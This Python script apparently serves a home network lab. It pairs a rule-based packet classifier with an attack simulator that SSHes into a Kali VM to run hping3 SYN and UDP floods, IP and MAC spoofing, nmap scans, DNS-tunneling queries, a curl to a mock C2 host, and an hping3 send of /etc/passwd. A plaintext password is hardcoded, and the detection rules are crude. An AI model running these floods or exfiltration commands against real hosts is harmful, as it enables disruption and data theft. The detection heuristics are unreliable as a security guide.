

# Ip spoofing teste ok
# TTL alterado ok
# syn flood ok
# UDP Flood ok
# DNS Tunneling

import subprocess
import time
import paramiko
import ipaddress
import os
import pandas as pd
from scapy.all import rdpcap, IP, TCP, UDP
from sklearn.ensemble import IsolationForest

# Funções auxiliares
def ip_privado(ip_str):
    ip_obj = ipaddress.ip_address(ip_str)
    redes_privadas = [
        ipaddress.ip_network("10.0.0.0/8"),
        ipaddress.ip_network("172.16.0.0/12"),
        ipaddress.ip_network("192.168.0.0/16"),
    ]
    return any(ip_obj in rede for rede in redes_privadas)









# def classificar_tipo_ataque(pkt):
#     # DHCP
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#
#     # NTP
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#
#     # # UDP Flood - detectar pacotes pequenos suspeitos
#     # if pkt.get('protocolo') == 'UDP' or (pkt['src_port'] == 0 and pkt['dst_port'] == 0 and pkt['ip_len'] < 200):
#     #     if pkt['ip_len'] < 200:
#     #         return "Ataque: UDP Flood"
#
#     # Se for UDP para outra porta que não 53
#     if pkt.get('protocolo') == 'UDP' and pkt['dst_port'] != 53 and pkt['src_port'] != 53:
#         if pkt['ip_len'] < 200:
#             return "Ataque: UDP Flood"
#
#     # DNS normal
#     # if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#     #     if pkt['ip_len'] < 600:
#     #         return "Consulta DNS (normal)"
#     #     else:
#     #         return "Resposta DNS grande (potencial tunneling)"
#
#         # DNS (consultas normais OU DNS tunneling)
#     # if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#     #     if pkt['ip_len'] > 300:  # normalmente consultas DNS pequenas têm menos de 300 bytes
#     #         return "Ataque: DNS Tunneling"
#     #     else:
#     #         return "Consulta DNS (normal)"
#
#     # if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#     #     # DNS Tunneling provável: payload pequeno mas consultas TXT muito frequentes
#     #     if pkt['ip_len'] < 200:
#     #         return "DNS Tunneling (consulta suspeita)"
#     #     elif pkt['ip_len'] < 600:
#     #         return "Consulta DNS (normal)"
#     #     else:
#     #         return "Resposta DNS grande (potencial tunneling)"
#
#     # Se for UDP para porta 53
#     if pkt.get('protocolo') == 'UDP' and (pkt['dst_port'] == 53 or pkt['src_port'] == 53):
#         if pkt['ip_len'] > 100 and pkt['ip_len'] < 600:
#             return "Ataque: DNS Tunneling"
#         else:
#             return "Consulta DNS (normal)"
#
#     # TCP SYN Flood
#     if pkt.get('protocolo') == 'TCP' and pkt.get('tcp_flags') == "S":
#         if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#             return "Ataque: TCP SYN Flood"
#
#     # HTTP normal
#     if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#         if pkt['ip_len'] < 500:
#             return "Tráfego HTTP (normal)"
#
#     # IP Spoofing Externo
#     if (not ip_privado(pkt['src_ip'])) and ip_privado(pkt['dst_ip']):
#         if pkt.get('tcp_flags') == "S":
#             return "IP Spoofing Externo"
#
#     # IP Spoofing Interno
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
#             return "IP Spoofing Interno"
#
#     # TLS Handshake Incompleto
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#
#     # SSH Brute Force
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
#
#     # Pacote Malformado (agora só para pacotes que NÃO são UDP flood)
#     if pkt['src_port'] == 0 or pkt['dst_port'] == 0:
#         if pkt.get('protocolo') != 'UDP':
#             return "Pacote Malformado"
#
#     # UDP Amplificação
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#
#     # TTL estranho
#     if pkt['ttl'] > 200:
#         return "TTL Anômalo (Evasão)"
#
#     return "Tipo desconhecido"




# def classificar_tipo_ataque(pkt):
#     # DHCP normal
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#
#     # NTP normal
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#
#     # UDP Flood - detectar pacotes UDP pequenos antes de DNS
#     if pkt.get('protocolo') == 'UDP':
#         if pkt['ip_len'] < 200:
#             return "Ataque: UDP Flood"
#
#     # DNS normal e DNS Tunneling
#     if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#         if pkt['ip_len'] < 600:
#             return "Consulta DNS (normal)"
#         else:
#             return "Ataque: DNS Tunneling"
#
#     # IP Spoofing Externo antes do SYN Flood
#     if pkt.get('protocolo') == 'TCP' and pkt.get('tcp_flags') == "S":
#         if not ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#             return "IP Spoofing Externo"
#         elif pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#             return "Ataque: TCP SYN Flood"
#
#     # Tráfego HTTP normal
#     if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#         if pkt['ip_len'] < 500:
#             return "Tráfego HTTP (normal)"
#
#     # IP Spoofing Interno
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
#             return "IP Spoofing Interno"
#
#     # TLS Handshake Incompleto
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#
#     # SSH Brute Force
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
#
#     # Pacote Malformado (apenas se não for UDP)
#     if pkt['src_port'] == 0 or pkt['dst_port'] == 0:
#         if pkt.get('protocolo') != 'UDP':
#             return "Pacote Malformado"
#
#     # UDP Amplificação
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#
#     # TTL estranho
#     if pkt['ttl'] > 200:
#         return "TTL Anômalo (Evasão)"
#
#     # Se não encaixar em nada
#     return "Tipo desconhecido"
#




# aqui arrumando para não alarmar como syn flood

# def classificar_tipo_ataque(pkt):
#     # 🛡️ Primeiro verificar TTL Alterado
#     if pkt.get('ttl') is not None and pkt['ttl'] <= 5:
#         return "Ataque: TTL Alterado (Evasão)"
#
#     # DHCP
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#
#     # NTP
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#
#     # UDP Flood - detectar pacotes UDP pequenos
#     if pkt.get('protocolo') == 'UDP' and pkt['ip_len'] < 200:
#         return "Ataque: UDP Flood"
#
#     # DNS normal ou resposta grande
#     if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#         if pkt['ip_len'] < 600:
#             return "Consulta DNS (normal)"
#         else:
#             return "Resposta DNS grande (potencial tunneling)"
#
#     # ⚡ IP Spoofing Externo primeiro (antes do SYN Flood)
#     if pkt.get('protocolo') == 'TCP' and pkt.get('tcp_flags') == "S":
#         if not ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#             return "IP Spoofing Externo"
#         elif pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#             return "Ataque: TCP SYN Flood"
#
#     # Tráfego HTTP normal
#     if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#         if pkt['ip_len'] < 500:
#             return "Tráfego HTTP (normal)"
#
#     # IP Spoofing Interno
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
#             return "IP Spoofing Interno"
#
#     # TLS Handshake Incompleto
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#
#     # SSH Brute Force
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
#
#     # Pacote Malformado (não UDP)
#     if (pkt['src_port'] == 0 or pkt['dst_port'] == 0) and pkt.get('protocolo') != 'UDP':
#         return "Pacote Malformado"
#
#     # UDP Amplificação
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#
#     return "Tipo desconhecido"

# def classificar_tipo_ataque(pkt):
#     # 🛡️ Primeiro verificar TTL Alterado
#     if pkt.get('ttl') is not None and pkt['ttl'] <= 5:
#         return "Ataque: TTL Alterado (Evasão)"
#
#     # DHCP
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#
#     # NTP
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#
#     # ⚡ DNS primeiro (antes de UDP Flood)
#     if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#         if pkt['ip_len'] < 100:
#             return "Ataque: DNS Tunneling"  # DNS Tunneling: consultas anormais muito pequenas
#         elif pkt['ip_len'] < 600:
#             return "Consulta DNS (normal)"
#         else:
#             return "Resposta DNS grande (potencial tunneling)"
#
#     # UDP Flood - agora sim: UDP pequeno que não era DNS
#     if pkt.get('protocolo') == 'UDP' and pkt['ip_len'] < 200:
#         return "Ataque: UDP Flood"
#
#     # ⚡ IP Spoofing Externo primeiro (antes do SYN Flood)
#     if pkt.get('protocolo') == 'TCP' and pkt.get('tcp_flags') == "S":
#         if not ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#             return "IP Spoofing Externo"
#         elif pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#             return "Ataque: TCP SYN Flood"
#
#     # Tráfego HTTP normal
#     if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#         if pkt['ip_len'] < 500:
#             return "Tráfego HTTP (normal)"
#
#     # IP Spoofing Interno
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
#             return "IP Spoofing Interno"
#
#     # TLS Handshake Incompleto
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#
#     # SSH Brute Force
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
#
#     # Pacote Malformado (não UDP)
#     if (pkt['src_port'] == 0 or pkt['dst_port'] == 0) and pkt.get('protocolo') != 'UDP':
#         return "Pacote Malformado"
#
#     # UDP Amplificação
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#
#     return "Tipo desconhecido"



# def classificar_tipo_ataque(pkt):
#     # 🛡️ Primeiro verificar TTL Alterado
#     if pkt.get('ttl') is not None and pkt['ttl'] <= 5:
#         return "Ataque: TTL Alterado (Evasão)"
#
#     # DHCP
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#
#     # NTP
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#
#     # ⚡ DNS normal ou DNS Tunneling
#     # if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#     #     if pkt['ip_len'] < 600:
#     #         if pkt['ip_len'] < 300:
#     #             return "Ataque: DNS Tunneling"
#     #         else:
#     #             return "Consulta DNS (normal)"
#     #     else:
#     #         return "Resposta DNS grande (potencial tunneling)"
#
#     if (pkt['dst_port'] == 53 or pkt['src_port'] == 53) and pkt.get('protocolo') == 'UDP':
#         if pkt['ip_len'] < 600:
#             if pkt['ip_len'] < 300:
#                 return "Ataque: DNS Tunneling"
#             else:
#                 return "Consulta DNS (normal)"
#         else:
#             return "Resposta DNS grande (potencial tunneling)"
#
#     # UDP Flood - só agora
#     if pkt.get('protocolo') == 'UDP' and pkt['ip_len'] < 200:
#         return "Ataque: UDP Flood"
#
#     # IP Spoofing Externo antes do SYN Flood
#     if pkt.get('protocolo') == 'TCP' and pkt.get('tcp_flags') == "S":
#         if not ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#             return "IP Spoofing Externo"
#         elif pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#             return "Ataque: TCP SYN Flood"
#
#     # Tráfego HTTP normal
#     if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#         if pkt['ip_len'] < 500:
#             return "Tráfego HTTP (normal)"
#
#     # IP Spoofing Interno
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
#             return "IP Spoofing Interno"
#
#     # TLS Handshake Incompleto
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#
#     # SSH Brute Force
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
#
#     # Pacote Malformado (não UDP)
#     if (pkt['src_port'] == 0 or pkt['dst_port'] == 0) and pkt.get('protocolo') != 'UDP':
#         return "Pacote Malformado"
#
#     # UDP Amplificação
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#
#     return "Tipo desconhecido"



def classificar_tipo_ataque(pkt):
    # 🛡️ Primeiro verificar TTL Alterado
    if pkt.get('ttl') is not None and pkt['ttl'] <= 5:
        return "Ataque: TTL Alterado (Evasão)"

    # DHCP
    if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
        return "Tráfego DHCP (normal)"

    # NTP
    if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
        return "Tráfego NTP (normal)"

    # 🛡️ Primeiro identificar UDP Flood
    # if pkt.get('protocolo') == 'UDP' and pkt['ip_len'] < 200:
    #     return "Ataque: UDP Flood"
    #
    # # ⚡ Depois identificar DNS normal ou DNS Tunneling (se for UDP e porta 53)
    # if (pkt['dst_port'] == 53 or pkt['src_port'] == 53) and pkt.get('protocolo') == 'UDP':
    #     if pkt['ip_len'] < 600:
    #         if pkt['ip_len'] < 300:
    #             return "Ataque: DNS Tunneling"
    #         else:
    #             return "Consulta DNS (normal)"
    #     else:
    #         return "Resposta DNS grande (potencial tunneling)"

    # ⚡ Primeiro identificar DNS normal ou DNS Tunneling (se UDP porta 53)
    # if (pkt['dst_port'] == 53 or pkt['src_port'] == 53) and pkt.get('protocolo') == 'UDP':
    #     if pkt['ip_len'] < 300:
    #         return "Ataque: DNS Tunneling"
    #     elif pkt['ip_len'] < 600:
    #         return "Consulta DNS (normal)"
    #     else:
    #         return "Resposta DNS grande (potencial tunneling)"
    #
    # # 🛡️ Agora sim: identificar UDP Flood
    # if pkt.get('protocolo') == 'UDP' and pkt['ip_len'] < 200:
    #     return "Ataque: UDP Flood"

    if (pkt['dst_port'] == 53 or pkt['src_port'] == 53) and pkt.get('protocolo') == 'UDP':
        if pkt['ip_len'] < 80:  # pacotes muito pequenos = flood
            return "Ataque: UDP Flood (porta 53)"
        elif pkt['ip_len'] < 300:
            return "Ataque: DNS Tunneling"
        elif pkt['ip_len'] < 600:
            return "Consulta DNS (normal)"
        else:
            return "Resposta DNS grande (potencial tunneling)"

    # IP Spoofing Externo antes do SYN Flood
    if pkt.get('protocolo') == 'TCP' and pkt.get('tcp_flags') == "S":
        if not ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
            return "IP Spoofing Externo"
        elif pkt['dst_port'] == 80 or pkt['src_port'] == 80:
            return "Ataque: TCP SYN Flood"

    # IP Spoofing Externo antes do SYN Flood
    # if pkt.get('protocolo') == 'TCP' and pkt.get('tcp_flags') == "S":
    #     if not ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
    #         return "IP Spoofing Externo"
    #     elif pkt['dst_port'] == 80 or pkt['src_port'] == 80:
    #         return "Ataque: TCP SYN Flood"
    #     else:
    #         return "Ataque: TCP SYN Scan"  # <--- aqui
    #
    # # Tráfego HTTP normal
    # if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
    #     if pkt['ip_len'] < 500:
    #         return "Tráfego HTTP (normal)"

    # IP Spoofing Interno
    if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
        if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
            return "IP Spoofing Interno"

    # TLS Handshake Incompleto
    if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
        return "TLS Handshake Incompleto"

    # SSH Brute Force
    if pkt['dst_port'] == 22:
        return "Tentativa de Brute Force SSH"

    # Pacote Malformado (não UDP)
    if (pkt['src_port'] == 0 or pkt['dst_port'] == 0) and pkt.get('protocolo') != 'UDP':
        return "Pacote Malformado"

    # UDP Amplificação
    if pkt['ip_len'] > 1500:
        return "Flood UDP ou Amplificação"

    return "Tipo desconhecido"


def capturar_pacotes(interface_id, duracao, nome_arquivo):
    print(f"\n[+] Capturando pacotes na interface {interface_id} por {duracao} segundos...")
    subprocess.run([
        r"C:\\Program Files\\Wireshark\\tshark.exe", "-i", interface_id,
        "-a", f"duration:{duracao}", "-w", nome_arquivo, "-F", "pcap"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def analisar_pcap(nome_arquivo):
    try:
        pkts = rdpcap(nome_arquivo)
    except Exception as e:
        print(f"❌ Erro ao abrir arquivo pcap: {e}")
        exit()

    linhas = []
    for pkt in pkts:
        if pkt.haslayer(IP):
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            ip_len = pkt[IP].len
            ttl = pkt[IP].ttl

            src_port = None
            dst_port = None
            tcp_flags = None
            protocolo = None  # <-- NOVO AQUI

            if pkt.haslayer(TCP):
                protocolo = 'TCP'
                src_port = pkt[TCP].sport
                dst_port = pkt[TCP].dport
                tcp_flags = pkt[TCP].sprintf("%flags%")
            elif pkt.haslayer(UDP):
                protocolo = 'UDP'
                src_port = pkt[UDP].sport
                dst_port = pkt[UDP].dport
            else:
                protocolo = 'OUTRO'

            # Se não conseguiu pegar portas, coloca como 0 (não deixa NaN)
            src_port = src_port if src_port is not None else 0
            dst_port = dst_port if dst_port is not None else 0

            # Ignorar multicast/broadcast
            # retirei o 53_dns da lista
            if dst_ip.startswith("224.") or (dst_port in [137, 123, 5353]):
                continue

            linhas.append({
                'src_ip': src_ip,
                'dst_ip': dst_ip,
                'src_port': int(src_port),
                'dst_port': int(dst_port),
                'ip_len': ip_len,
                'ttl': ttl,
                'tcp_flags': tcp_flags,
                'protocolo': protocolo  # <-- NOVO AQUI
            })

    return pd.DataFrame(linhas)


def analisar_anomalias(df):
    if df.empty:
        print("✅ Nenhum tráfego relevante capturado.")
        return

    print("\n⚠️ Anomalias detectadas:")

    ips_spoofados = set()
    logs = []
    respostas_indesejadas = 0
    contador_ataques = {}
    exemplos_ataques = {}  # NOVO: guardar amostras para cada tipo de ataque

    # Primeiro passo: detectar pacotes anômalos
    for _, linha in df.iterrows():
        tipo = classificar_tipo_ataque(linha)

        # Atualiza contador de tipos de ataques
        contador_ataques[tipo] = contador_ataques.get(tipo, 0) + 1

        # Guardar alguns exemplos de pacotes por tipo
        if tipo not in exemplos_ataques:
            exemplos_ataques[tipo] = []
        if len(exemplos_ataques[tipo]) < 5:  # limite de 5 exemplos por tipo
            exemplos_ataques[tipo].append(f"{linha['src_ip']} → {linha['dst_ip']} (Portas {linha['src_port']} → {linha['dst_port']})")

        # Identificar IP spoofing para análise posterior
        if tipo in ["IP Spoofing Interno", "IP Spoofing Externo"]:
            ips_spoofados.add(linha['src_ip'])

    # Segundo passo: analisar respostas para IP spoofado
    for _, linha in df.iterrows():
        if linha['dst_ip'] in ips_spoofados and linha['src_ip'] not in ips_spoofados:
            respostas_indesejadas += 1

    # Gerar o relatório final
    print("\n📄 Relatório Final:")

    if contador_ataques:
        print("\nResumo dos tipos de ataque detectados:")
        for tipo, quantidade in contador_ataques.items():
            print(f"- {tipo}: {quantidade} ocorrência(s)")

            # Exibir exemplos de cada tipo
            if exemplos_ataques.get(tipo):
                print(f"  Exemplos ({len(exemplos_ataques[tipo])}):")
                for exemplo in exemplos_ataques[tipo]:
                    print(f"    {exemplo}")

    else:
        print("✅ Nenhum ataque detectado.")

    # Mostrar alerta de respostas indevidas
    if respostas_indesejadas > 0:
        print(f"\n⚠️ Total de respostas indevidas a IPs spoofados: {respostas_indesejadas}")
    else:
        print("\n✅ Nenhuma resposta indevida detectada.")

    print("\n✅ Análise concluída.")



def executar_ataque(ip_kali, ip_vitima, opcao, ip_spoofado=None, mac_fake=None):
    comandos = {
        "1": f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10",
        "2": f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood",
        "3": f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}",
        "4": (
            f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
            f"sudo ip link set eth0 address {mac_fake} && "
            f"sudo ip link set eth0 up && ping -c 5 {ip_vitima} && "
            f"sudo ip link set eth0 down && sudo ip link set eth0 address 00:0c:29:f7:61:06 && sudo ip link set eth0 up"
        ),
        "5": f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}",
        "6": f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}",
        "7": f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}",
        "8": f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && curl -I http://{ip_vitima} && sudo tc qdisc del dev eth0 root",
        "9": f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done",
        "10": f"dig any comandos.controle.tk && curl http://c2.fake.ru",
        "11": f"curl -A \"FakeScannerBot/9.9 (linux; rootkit)\" http://{ip_vitima}",
        "12": f"timeout 1 openssl s_client -connect {ip_vitima}:443"
    }
    print("🔐 Conectando na VM Kali...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
    comando = comandos.get(opcao)
    if comando:
        print(f"🚀 Executando ataque: {comando}")
        stdin, stdout, stderr = ssh.exec_command(comando)
        print(stdout.read().decode())
        print(stderr.read().decode())
    else:
        print("❌ Opção inválida.")
    ssh.close()

# Programa principal
print("\U0001F9E0 Modo de Operação:\n")
print("1️⃣ Verificar a rede (modo monitoramento)")
print("2️⃣ Simular ataque (modo ofensivo)")
modo = input("\nEscolha o modo (1-2): ").strip()

if modo == "1":
    interface_id = "4"
    duracao = input("Digite o tempo de captura (em segundos): ").strip() or "60"
    # duracao = int(input("Digite o tempo de captura (em segundos): ").strip() or "60")
    nome_arquivo = "captura_ataque.pcap"
    capturar_pacotes(interface_id, duracao, nome_arquivo)
    df = analisar_pcap(nome_arquivo)
    analisar_anomalias(df)
    print("\n✅ Monitoramento finalizado.")

elif modo == "2":
    print("\n🔐 Simulador de Ataques:")
    print("1️⃣ IP Spoofing\n2️⃣ TCP SYN Flood\n3️⃣ UDP Flood\n4️⃣ MAC Spoofing\n5️⃣ Fragmentação Suspeita")
    print("6️⃣ TTL Alterado\n7️⃣ TCP SYN Scan\n8️⃣ Retransmissões Excessivas\n9️⃣ DNS Tunneling")
    print("🔟 Domínios Suspeitos\n1️⃣1️⃣ User-Agent Anormal\n1️⃣2️⃣ TLS Handshake Incompleto")

    opcao = input("\nSelecione o tipo de ataque (1-12): ").strip()
    ip_kali = input("🖥️ IP da máquina Kali: ").strip()
    ip_vitima = input("🎯 IP da máquina vítima: ").strip()
    ip_spoofado = mac_fake = None

    if opcao == "1":
        ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
    elif opcao == "4":
        mac_fake = input("🧬 MAC a ser falsificado: ").strip()

    interface_id = "4"
    nome_arquivo = "captura_ataque.pcap"
    capturar_pacotes(interface_id, 60, nome_arquivo)
    executar_ataque(ip_kali, ip_vitima, opcao, ip_spoofado, mac_fake)
    df = analisar_pcap(nome_arquivo)
    analisar_anomalias(df)
    print("\n✅ Simulação finalizada.")

else:
    print("\u274c Modo inválido. Encerrando.")
#